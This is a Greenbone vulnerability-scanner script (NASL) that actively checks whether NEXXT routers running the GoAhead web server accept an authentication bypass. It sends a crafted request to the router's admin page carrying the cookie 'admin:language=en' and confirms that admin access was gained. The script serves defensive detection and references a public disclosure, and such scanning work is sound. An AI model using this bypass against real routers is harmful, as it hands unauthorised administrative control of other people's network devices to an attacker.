# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:embedthis:goahead";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113014");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2017-10-12 11:19:20 +0200 (Thu, 12 Oct 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("NEXXT Routers Authentication Bypass Vulnerability (Sep 2017) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_embedthis_goahead_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("embedthis/goahead/http/detected");

  script_tag(name:"summary", value:"Setting a specific cookie allows for authentication bypass in
  NEXXT Routers.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Setting the cookie 'admin:language=en' bypasses the
  authentication.");

  script_tag(name:"impact", value:"Successful exploitation allows the attacker to gain admin access
  without authentication.");

  script_tag(name:"affected", value:"All NEXXT Routers. Other Routers using the same authentication
  mechanism might be affected, too.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3414");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2017/Sep/42");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe: CPE, service: "www" ) )
  exit( 0 );

if( ! get_app_location( cpe: CPE, port: port, nofork: TRUE ) )
  exit( 0 );

content = http_get_cache( port: port, item: "/login.asp" );
if( "<title>LOGIN</title>" >!< content || !eregmatch( pattern: "(<title>.+Router.{0,}<\/title>)", string: content ) )
  exit( 0 );

ip = get_host_ip();
hostname = http_host_name( dont_add_port: TRUE );

# Cookie "admin:language=en" allows for authentication bypass
add_headers = make_array( "Cache-Control", "max-age=0", "Connection", "keep-alive", "Cookie", "admin:language=en", "Accept-Encoding", "gzip, deflate, sdch", "Accept-Language", "en-US,en;q=0.8", "Upgrade-Insecure-Requests", "1" );

url = "/advance.asp";
req = http_get_req( port: port, url: url, add_headers: add_headers, accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );

# The exploit doesn't seem to work if the request is using the hostname. Using the IP works, though. Thus the replacement.
req = ereg_replace( string: req, pattern: hostname, replace:ip, icase:TRUE );

res = http_keepalive_send_recv( port: port, data: req );

if( 'Butterlate.setTextDomain("system_tool");'>< res ) {
  report = "It was possible to bypass authentication and gain administrative access.";
  report += '\n\n' + http_report_vuln_url( port: port, url: url );
  security_message( port: port, data: report );
  exit( 0 );
}

exit( 99 );
